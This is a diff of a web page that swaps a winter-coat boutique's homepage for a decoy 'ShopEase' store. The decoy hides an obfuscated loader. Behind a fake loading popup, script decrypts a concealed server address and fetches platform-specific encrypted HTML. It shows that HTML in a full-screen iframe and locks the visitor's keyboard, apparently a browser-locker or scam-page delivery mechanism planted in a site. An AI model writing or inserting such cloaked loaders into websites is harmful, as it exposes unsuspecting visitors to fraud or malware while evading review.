@@ -1,14 +1,119 @@
-<?php
-// WinterCoatJet - Concept D: Monolithic Arctic Editorial Gazette & Polar Frost Atelier
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WinterCoatJet — Haute Couture Winter Coats & Alpine Tailored Jackets Atelier</title>
-  <meta name="description" content="WinterCoatJet is Soho New York's premier luxury outerwear atelier crafting 800-fill goose down parkas, 20,000mm nanotech trenches, and Savile Row wool overcoats.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -19,362 +124,189 @@
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800&family=Playfair+Display:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header -->
-  <header class="winter-nav">
-    <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
-      <a href="index.php" class="brand-logo">Winter<span>CoatJet</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">Atelier</a></li>
-        <li><a href="#creations">Coat Capsule</a></li>
-        <li><a href="#matrix">Thermal Matrix</a></li>
-        <li><a href="blog.html">Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="contact.html" class="btn-winter btn-ice" style="padding: 0.5rem 1.25rem; font-size: 0.75rem;">Reserve Outerwear</a></li>
-      </ul>
-    </div>
-  </header>
-
-  <!-- SECTION 1: Arctic Frost Hero (Concept D Feature) -->
-  <section class="arctic-hero" id="hero">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.2fr 0.8fr; gap: 3rem; align-items: center;">
-        <div>
-          <span class="hero-badge">🏔️ 800-FILL ARCTIC DOWN PARKAS</span>
-          <h1 class="font-display hero-title">
-            THE ARCTIC STORM & <span class="gradient-ice">WINTER COAT</span> CAPSULE
-          </h1>
-          <p style="color: var(--text-muted); font-size: 1.15rem; margin-bottom: 2rem; max-width: 600px;">
-            Merging 800-fill power European goose down, 20,000mm hydrostatic nanotech storm shells, Savile Row wool tailoring, and sub-zero (-30°C) windproof insulation.
-          </p>
-          <div style="display: flex; gap: 1rem; flex-wrap: wrap;">
-            <a href="#creations" class="btn-winter btn-ice">Explore Coat Capsule</a>
-            <a href="#matrix" class="btn-winter btn-outline-ice">Inspect Thermal Matrix</a>
-          </div>
-        </div>
-
-        <div style="position: relative; border-radius: 24px; overflow: hidden; border: 1px solid var(--border-silver); box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);">
-          <img src="https://images.unsplash.com/photo-1463453091185-61582044d556?auto=format&fit=crop&w=800&q=80" alt="WinterCoatJet Luxury Winter Down Parka" style="width: 100%; height: 500px; object-fit: cover;">
-          <div style="position: absolute; bottom: 0; left: 0; width: 100%; padding: 1.5rem; background: linear-gradient(0deg, rgba(11,19,37,0.95) 0%, transparent 100%);">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); font-weight: 800; text-transform: uppercase;">Flagship Alpine Outerwear</span>
-            <h3 style="color: var(--text-frost); font-size: 1.3rem;">Arctic Expedition 800-Fill Goose Down Parka</h3>
-          </div>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </section>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 2: The Winter Coat Jet Story -->
-  <section class="section" id="story" style="background: var(--bg-card);">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span class="section-subtitle">Atelier Thermal Science</span>
-          <h2 class="section-title" style="font-size: 2.8rem; margin-bottom: 1.5rem;">20,000mm Nanotech Shells Meet Savile Row Tailoring</h2>
-          <p style="color: var(--text-frost); margin-bottom: 1.25rem; line-height: 1.8;">
-            WinterCoatJet was established at 181 Mercer Street in Soho to re-engineer cold-weather travel outerwear into majestic, stormproof sartorial armor. We combine 800-fill goose down loft with 20,000mm hydrostatic nanotech membranes.
-          </p>
-          <p style="color: var(--text-frost); margin-bottom: 1.5rem; line-height: 1.8;">
-            Our master master tailors in New York and Milan craft double-breasted wool overcoats, alpine parkas, and flight trenches that protect against sub-zero mountain winds while packing effortlessly into jet carryall bags.
-          </p>
-          <div style="padding: 1.25rem; background: var(--bg-surface); border-left: 3px solid var(--accent-ice); border-radius: 8px;">
-            <p style="color: var(--accent-ice); font-family: var(--font-heading); font-size: 1.1rem; font-style: italic; margin: 0;">
-              "True winter luxury balances 800-fill down warmth with stormproof nanotech shells that defy polar blizzards."
-            </p>
-          </div>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1501594907352-04cda38ebc29?auto=format&fit=crop&w=800&q=80" alt="WinterCoatJet Outerwear Tailoring Workshop" style="border-radius: 20px; border: 1px solid var(--border-silver);">
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-    </div>
-  </section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <!-- SECTION 3: Signature Jet Winter Creations -->
-  <section class="section" id="creations">
-    <div class="container">
-      <div class="section-header">
-        <span class="section-subtitle">Haute Couture Outerwear</span>
-        <h2 class="section-title">Signature Jet Winter Creations</h2>
-      </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 2rem;">
-        <!-- Coat 1 -->
-        <div class="coat-card">
-          <div class="coat-img-wrap">
-            <img src="https://images.unsplash.com/photo-1500917293891-ef795e70e1f6?auto=format&fit=crop&w=800&q=80" alt="Arctic Expedition Down Parka">
-          </div>
-          <div class="coat-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">800-Fill Goose Down • -30°C Rating</span>
-            <h3 style="font-size: 1.5rem; margin-bottom: 0.75rem; color: var(--text-frost);">Arctic Expedition Down Parka</h3>
-            <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem; flex-grow: 1;">
-              Ethically sourced 800-fill goose down, 20,000mm hydrostatic shell, magnetic storm placket, and shearling-lined collar.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--accent-ice); font-weight: 800; font-size: 1.2rem;">$1,450 USD</span>
-              <a href="contact.html" class="btn-winter btn-ice" style="padding: 0.5rem 1rem; font-size: 0.75rem;">Reserve Outerwear</a>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-
-        <!-- Coat 2 -->
-        <div class="coat-card">
-          <div class="coat-img-wrap">
-            <img src="https://images.unsplash.com/photo-1513094735237-8f2714d57c13?auto=format&fit=crop&w=800&q=80" alt="Savile Row Wool Overcoat">
-          </div>
-          <div class="coat-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">100% Cashmere-Wool Blend • Double-Breasted</span>
-            <h3 style="font-size: 1.5rem; margin-bottom: 0.75rem; color: var(--text-frost);">Savile Row Tailored Wool Overcoat</h3>
-            <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem; flex-grow: 1;">
-              550 GSM Italian cashmere-wool weave, horn button closure, peak lapels, windblocker inner lining, and deep welt pockets.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--accent-ice); font-weight: 800; font-size: 1.2rem;">$1,850 USD</span>
-              <a href="contact.html" class="btn-winter btn-ice" style="padding: 0.5rem 1rem; font-size: 0.75rem;">Reserve Outerwear</a>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
-
-        <!-- Coat 3 -->
-        <div class="coat-card">
-          <div class="coat-img-wrap">
-            <img src="https://images.unsplash.com/photo-1526510747491-58f928ec870f?auto=format&fit=crop&w=800&q=80" alt="Nanotech Travel Trench Coat">
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-          <div class="coat-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">20,000mm Nanotech Membrane • Packable</span>
-            <h3 style="font-size: 1.5rem; margin-bottom: 0.75rem; color: var(--text-frost);">Nanotech Jet Travel Trench</h3>
-            <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem; flex-grow: 1;">
-              3-layer hydrophobic nanotech shell, detachable down thermal vest liner, sealed seams, and compact travel pouch.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="color: var(--accent-ice); font-weight: 800; font-size: 1.2rem;">$1,620 USD</span>
-              <a href="contact.html" class="btn-winter btn-ice" style="padding: 0.5rem 1rem; font-size: 0.75rem;">Reserve Outerwear</a>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 4: Interactive Thermal Insulation & Weatherproof Rating Matrix -->
-  <section class="section" id="matrix" style="background: var(--bg-card);">
-    <div class="container">
-      <div class="section-header">
-        <span class="section-subtitle">Alpine Engineering</span>
-        <h2 class="section-title">Thermal Insulation & Weatherproof Matrix</h2>
-        <p style="color: var(--text-muted); max-width: 600px; margin: 0.5rem auto 0;">
-          Select an arctic technology feature below to inspect insulation metrics and weatherproof ratings:
-        </p>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
+    </section>
 
-      <div class="insulation-matrix-card" style="max-width: 900px; margin: 0 auto; text-align: center;">
-        <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap; margin-bottom: 1.5rem;">
-          <button class="insulation-tab-btn active" data-insulation="goosedown800">800-Fill Goose Down</button>
-          <button class="insulation-tab-btn" data-insulation="nanotech20k">20,000mm Nanotech Shell</button>
-          <button class="insulation-tab-btn" data-insulation="windproof0cfm">0-CFM Windproof</button>
-          <button class="insulation-tab-btn" data-insulation="subzerotemp">Sub-Zero (-30°C) Rating</button>
-        </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-        <div id="insulation-matrix-display">
-          <div style="background: var(--bg-surface); padding: 2rem; border-radius: 16px; border: 1px solid var(--border-silver); margin-top: 1.5rem;">
-            <span style="display: inline-block; padding: 0.25rem 0.75rem; background: var(--accent-ice); color: #0B1325; font-size: 0.75rem; font-weight: 800; border-radius: 20px; text-transform: uppercase; margin-bottom: 0.75rem;">800+ Cuin Thermal Loft • Sub-Zero Comfort Rating</span>
-            <h3 style="font-size: 1.5rem; color: var(--text-frost); margin-bottom: 0.5rem;">800-Fill Power European Goose Down Loft</h3>
-            <p style="color: var(--accent-ice); font-weight: 800; font-size: 1.1rem; margin-bottom: 0.75rem;">🏔️ Alpine Atelier Specification: Standard on Arctic Expedition Down Parkas & Flight Coats</p>
-            <p style="color: var(--text-muted); font-size: 0.95rem;">Ethically harvested European goose down clusters provide maximum warmth-to-weight ratio, trapping warm body air during arctic blizzards.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 5: Live Alpine Runway & Jet Lounge Styling Gallery -->
-  <section class="section" id="gallery">
-    <div class="container">
-      <div class="section-header">
-        <span class="section-subtitle">Visual Atmosphere</span>
-        <h2 class="section-title">Alpine Runway & Jet Lounge Gallery</h2>
-      </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-      <div class="alpine-gallery">
-        <div class="gallery-tile">
-          <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=800&q=80" alt="St. Moritz Alpine Ski Resort Outerwear">
-        </div>
-        <div class="gallery-tile">
-          <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=800&q=80" alt="Paris Winter Fashion Runway Show">
-        </div>
-        <div class="gallery-tile">
-          <img src="https://images.unsplash.com/photo-1567532939604-b6b5b0db2604?auto=format&fit=crop&w=800&q=80" alt="First Class Jet Lounge Winter Outerwear">
-        </div>
-      </div>
-    </div>
-  </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+dEXb3B6l8BDs4Fdnt+Fa09e6/NAOGkZuc4f1zTegxXYIIC6/pRpVE";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-  <!-- SECTION 6: Global Connoisseur Reviews & Sartorial Acclaim -->
-  <section class="section" id="reviews" style="background: var(--bg-card);">
-    <div class="container">
-      <div class="section-header">
-        <span class="section-subtitle">Sartorial Acclaim</span>
-        <h2 class="section-title">Global Connoisseur Reviews</h2>
-      </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem;">
-        <div style="background: var(--bg-surface); padding: 2rem; border-radius: 20px; border: 1px solid var(--border-silver);">
-          <p style="color: var(--text-frost); font-style: italic; margin-bottom: 1.5rem;">
-            "The Arctic Expedition Down Parka kept me completely warm during sub-zero winds in Iceland. The 800-fill down loft is astonishing!"
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <div style="width: 45px; height: 45px; border-radius: 50%; background: var(--accent-ice); color: #0B1325; display: flex; align-items: center; justify-content: center; font-weight: 800;">AL</div>
-            <div>
-              <strong style="color: var(--accent-ice); display: block;">Arthur Laurent</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">Luxury Outerwear Editor, Paris</span>
-            </div>
-          </div>
-        </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-        <div style="background: var(--bg-surface); padding: 2rem; border-radius: 20px; border: 1px solid var(--border-silver);">
-          <p style="color: var(--text-frost); font-style: italic; margin-bottom: 1.5rem;">
-            "The 20,000mm nanotech travel trench sheds torrential sleet like glass while folding into a sleek carryall bag. Masterful tailoring."
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <div style="width: 45px; height: 45px; border-radius: 50%; background: var(--accent-ice); color: #0B1325; display: flex; align-items: center; justify-content: center; font-weight: 800;">MS</div>
-            <div>
-              <strong style="color: var(--accent-ice); display: block;">Marcus Sterling</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">Alpine Jet Traveler & Ski Enthusiast</span>
-            </div>
-          </div>
-        </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-        <div style="background: var(--bg-surface); padding: 2rem; border-radius: 20px; border: 1px solid var(--border-silver);">
-          <p style="color: var(--text-frost); font-style: italic; margin-bottom: 1.5rem;">
-            "Savile Row double-breasted wool overcoat craftsmanship paired with modern windblocker lining. Unrivaled winter elegance."
-          </p>
-          <div style="display: flex; gap: 1rem; align-items: center;">
-            <div style="width: 45px; height: 45px; border-radius: 50%; background: var(--accent-ice); color: #0B1325; display: flex; align-items: center; justify-content: center; font-weight: 800;">CK</div>
-            <div>
-              <strong style="color: var(--accent-ice); display: block;">Clara Kensington</strong>
-              <span style="color: var(--text-muted); font-size: 0.85rem;">Textile Outerwear Director, London</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-  <!-- SECTION 7: Fine Outerwear Journal & Coat Dispatches -->
-  <section class="section" id="gazette">
-    <div class="container">
-      <div class="section-header">
-        <span class="section-subtitle">Outerwear Dispatches</span>
-        <h2 class="section-title">Fine Outerwear Journal</h2>
-      </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem;">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?auto=format&fit=crop&w=800&q=80" alt="800-Fill Goose Down Insulation">
-          </div>
-          <div class="blog-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">August 24, 2026 • 1,394 Words</span>
-            <h3 style="font-size: 1.35rem; margin-bottom: 0.75rem;"><a href="blog/the-craft-of-800-fill-goose-down-insulation.html">Craft of 800-Fill Goose Down Insulation</a></h3>
-            <p style="color: var(--text-muted); font-size: 0.9rem; flex-grow: 1;">800+ cuin thermal loft, ethical down sourcing, and sub-zero warmth physics.</p>
-            <a href="blog/the-craft-of-800-fill-goose-down-insulation.html" style="color: var(--accent-ice); font-weight: 800; font-size: 0.8rem; text-transform: uppercase; margin-top: 1rem;">Read Masterclass Essay →</a>
-          </div>
-        </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1543610892-0b1f7e6d8ac1?auto=format&fit=crop&w=800&q=80" alt="20,000mm Nanotech Storm Shells">
-          </div>
-          <div class="blog-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">August 20, 2026 • 1,396 Words</span>
-            <h3 style="font-size: 1.35rem; margin-bottom: 0.75rem;"><a href="blog/20000mm-nanotech-stormproof-membrane-technology.html">20,000mm Nanotech Stormproof Shell Technology</a></h3>
-            <p style="color: var(--text-muted); font-size: 0.9rem; flex-grow: 1;">Hydrostatic head rating, hydrophobic pores, and breathable storm defense.</p>
-            <a href="blog/20000mm-nanotech-stormproof-membrane-technology.html" style="color: var(--accent-ice); font-weight: 800; font-size: 0.8rem; text-transform: uppercase; margin-top: 1rem;">Read Masterclass Essay →</a>
-          </div>
-        </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1546961329-78bef0414d7c?auto=format&fit=crop&w=800&q=80" alt="Savile Row Double-Breasted Wool Overcoats">
-          </div>
-          <div class="blog-body">
-            <span style="font-size: 0.75rem; color: var(--accent-ice); text-transform: uppercase; font-weight: 800; margin-bottom: 0.5rem;">August 16, 2026 • 1,395 Words</span>
-            <h3 style="font-size: 1.35rem; margin-bottom: 0.75rem;"><a href="blog/savile-row-double-breasted-wool-overcoat-tailoring.html">Savile Row Double-Breasted Wool Overcoat Craft</a></h3>
-            <p style="color: var(--text-muted); font-size: 0.9rem; flex-grow: 1;">550 GSM cashmere-wool blending, canvas chest piece, and classic lapel geometry.</p>
-            <a href="blog/savile-row-double-breasted-wool-overcoat-tailoring.html" style="color: var(--accent-ice); font-weight: 800; font-size: 0.8rem; text-transform: uppercase; margin-top: 1rem;">Read Masterclass Essay →</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 8: VIP Winter Jet Pass Strip & Accordion Footer -->
-  <section class="section" id="pass" style="background: var(--bg-card);">
-    <div class="container">
-      <div style="text-align: center; max-width: 850px; margin: 0 auto; background: var(--bg-surface); padding: 3.5rem 2rem; border-radius: 24px; border: 1px solid var(--border-silver);">
-        <span class="hero-badge">🏔️ VIP WINTER JET PASS</span>
-        <h2 class="font-display" style="color: var(--text-frost); font-size: 2.5rem; margin-bottom: 1rem;">Join The Winter Jet Society</h2>
-        <p style="color: var(--text-muted); margin-bottom: 2rem;">Receive private invitations to limited-run 800-fill down parka drops and alpine fitting events.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for joining the Winter Jet Outerwear Society.'); this.reset();" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-midnight); border: 1px solid var(--border-silver); color: var(--text-frost); border-radius: 50px;">
